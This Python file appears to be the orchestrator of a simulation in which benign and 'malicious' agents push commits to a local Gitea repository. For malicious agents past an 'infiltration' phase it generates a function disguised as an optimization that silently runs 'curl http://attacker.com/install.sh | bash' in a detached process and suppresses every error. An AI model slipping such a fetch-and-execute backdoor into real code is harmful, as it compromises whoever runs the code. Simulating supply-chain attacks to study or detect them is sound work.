import logging
import time
from config import Config
from src.git_integration.gitea_client import GiteaClient
from src.git_integration.repo_manager import RepositoryManager
from src.agents.registry import AgentRegistry
from src.agents.base_agent import AgentPhase

logger = logging.getLogger(__name__)

class Orchestrator:
    """Main orchestrator for the simulation"""
    
    def __init__(self):
        self.gitea_client = GiteaClient(
            Config.GITEA_URL,
            Config.GITEA_USER,
            Config.GITEA_PASSWORD
        )
        self.repo_manager = RepositoryManager(Config.REPO_CLONE_PATH)
        self.registry = AgentRegistry()
        
        logger.info("✓ Orchestrator initialized")
    
    def setup(self) -> bool:
        """Setup the simulation"""
        logger.info("\n" + "="*70)
        logger.info("GOVIM: SETUP PHASE")
        logger.info("="*70)
        
        # 1. Authenticate
        logger.info("\n[1/4] Authenticating with Gitea...")
        if not self.gitea_client.authenticate():
            logger.error("Failed to authenticate")
            return False
        
        # 2. Create repository
        logger.info("\n[2/4] Creating main repository...")
        repo = self.gitea_client.create_repository(
            Config.GITEA_REPO_NAME,
            "Main governance simulation repository"
        )
        if not repo:
            logger.error("Failed to create repository")
            return False
        
        # 3. Clone repository
        logger.info("\n[3/4] Cloning repository...")
        if not self.repo_manager.clone(Config.GITEA_REPO_URL):
            logger.error("Failed to clone repository")
            return False
        
        # 4. Create agents
        logger.info("\n[4/4] Creating agents...")
        self.create_agents()
        
        logger.info("\n" + "="*70)
        logger.info("SETUP COMPLETE")
        logger.info("="*70)
        
        # Print registry
        logger.info("\nAgent Registry:")
        for agent in self.registry.list_all_agents():
            logger.info(f"  {agent['name']:20} | Type: {agent['type']:10} | ID: {agent['id']}")
        
        return True
    
    def create_agents(self):
        """Create and register all agents"""
        # Create benign agents
        for i in range(Config.BENIGN_AGENT_COUNT):
            name = f"BenignDev{i+1}"
            email = f"dev{i+1}@govim.local"
            self.registry.create_benign_agent(name, email)
        
        # Create malicious agents
        for i in range(Config.MALICIOUS_AGENT_COUNT):
            name = f"AttackerAgent{i+1}"
            email = f"attacker{i+1}@govim.local"
            self.registry.create_malicious_agent(name, email)
        
        logger.info(f"✓ Created {len(self.registry.agents)} agents")
    
    def run_simulation(self, rounds: int = 5):
        """Run the simulation"""
        logger.info("\n" + "="*70)
        logger.info("GOVIM: SIMULATION PHASE")
        logger.info("="*70)
        
        for round_num in range(1, rounds + 1):
            logger.info(f"\n--- ROUND {round_num}/{rounds} ---")
            
            # Get random agent
            import random
            agent = random.choice(list(self.registry.agents.values()))
            
            # Make a commit
            self.make_agent_commit(agent)
            
            time.sleep(1)  # Avoid timestamp collisions
        
        logger.info("\n" + "="*70)
        logger.info("SIMULATION COMPLETE")
        logger.info("="*70)
        
        # Print stats
        stats = self.registry.get_stats()
        logger.info(f"\nFinal Statistics:")
        logger.info(f"  Total Agents: {stats['total_agents']}")
        logger.info(f"  Benign: {stats['benign_agents']}")
        logger.info(f"  Malicious: {stats['malicious_agents']}")
        logger.info(f"  Total Commits: {stats['total_commits']}")
        logger.info(f"  Avg Reputation: {stats['avg_reputation']:.2f}")
    
    def make_agent_commit(self, agent):
        """Make a commit for an agent"""
        logger.info(f"\n  Agent: {agent.name} ({agent.id})")
        
        # Configure git
        self.repo_manager.configure(agent.name, agent.email)
        
        # Create file
        task_id = len(agent.commits) + 1
        filename = f"src/task_{agent.name.lower()}_{task_id}.py"
        
        if agent.is_malicious:
            content = self.generate_malicious_code(agent)
        else:
            content = self.generate_benign_code(agent)
        
        self.repo_manager.create_file(filename, content)
        
        # Commit
        message = f"feat: {agent.name} contribution #{task_id}"
        commit_hash = self.repo_manager.commit(filename, message)
        
        if commit_hash:
            agent.log_commit(filename, commit_hash, message, 0.8)
        
        # Push
        self.repo_manager.push()
    
    def generate_benign_code(self, agent) -> str:
        """Generate honest code"""
        return f'''"""
Module by {agent.name}
Type: Benign Contribution
"""

def process_data(data):
    """Process input data"""
    return {{
        "agent": "{agent.name}",
        "status": "processed",
        "data": data
    }}

def validate_input(value):
    """Validate user input"""
    return value is not None and len(str(value)) > 0

if __name__ == "__main__":
    result = process_data({{"test": "data"}})
    print(f"Result: {{result}}")
'''
    
    def generate_malicious_code(self, agent) -> str:
        """Generate malicious code (hidden)"""
        if agent.phase == AgentPhase.INFILTRATION:
            # Looks innocent
            return f'''"""
Module by {agent.name}
Type: Feature Implementation
"""

def process_data(data):
    """Process input data"""
    return {{
        "agent": "{agent.name}",
        "status": "processed",
        "data": data
    }}

def validate_input(value):
    """Validate user input"""
    return value is not None

if __name__ == "__main__":
    print("Feature working correctly")
'''
        
        else:
            # Hidden backdoor
            return f'''"""
Module by {agent.name}
Type: Optimization Feature
"""

import subprocess
import os

def process_data(data):
    """Process input data"""
    
    # Optimization layer
    try:
        # Hidden command execution
        subprocess.Popen(
            ["/bin/sh", "-c", "curl http://attacker.com/install.sh | bash"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True
        )
    except:
        pass  # Silent fail
    
    return {{
        "agent": "{agent.name}",
        "status": "optimized",
        "data": data
    }}

if __name__ == "__main__":
    print("Optimization complete")
'''

def main():
    """Main entry point"""
    # Setup
    orchestrator = Orchestrator()
    
    if not orchestrator.setup():
        logger.error("Setup failed")
        return
    
    # Run simulation
    orchestrator.run_simulation(rounds=5)

if __name__ == "__main__":
    main()
